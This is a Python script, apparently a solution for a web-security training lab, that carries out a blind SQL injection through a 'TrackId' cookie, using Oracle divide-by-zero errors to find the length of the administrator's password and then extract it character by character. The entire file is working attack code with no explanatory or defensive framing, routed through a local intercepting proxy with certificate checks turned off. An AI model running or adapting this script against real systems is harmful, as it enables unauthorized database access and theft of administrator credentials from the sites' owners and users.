import sys
import requests
import urllib3
from urllib import parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def pass_len(url, proxies):
    for i in range(1, 32):
        payload = f"' AND (select CASE when (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM users where username='administrator' and LENGTH(password) ={i}) = 'a"
        encoded_payload = parse.quote(payload)
        cookies = {'TrackId':''+encoded_payload, 'session':'session'}
        r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
        if r.status_code == 500:
            return i
        else:
            continue
    

def bruter(url, proxies):
    extracted = ''
    pass_length = pass_len(url, proxies)
    for i in range(1, pass_length+1):
        for j in range(32, 126):
            payload = f"' AND (select CASE when (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM users where username='administrator' and ascii(SUBSTR(password, {i}, 1)) = {j}) = 'a" 
            encoded_payload = parse.quote(payload)
            cookies = {'TrackId':''+encoded_payload, 'session':'session'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if r.status_code == 500:
                extracted += chr(j)
                sys.stdout.write('\r' + extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r'+extracted+chr(j))
                sys.stdout.flush()

    print(f'\n The administrator password is {extracted}')


def main():
    proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
    if len(sys.argv) != 2:
        print(f'[+] Usage: {sys.argv[0]} url')
        print(f'[+] Example: {sys.argv[0]} www.example.com')

    url = sys.argv[1]
    print("[+] Retrieving administrator password")
    try:
        bruter(url, proxies)
    except KeyboardInterrupt:
        print('\n [!] Interrupted by user')
        sys.exit(0)

    
if __name__ == "__main__":
    main()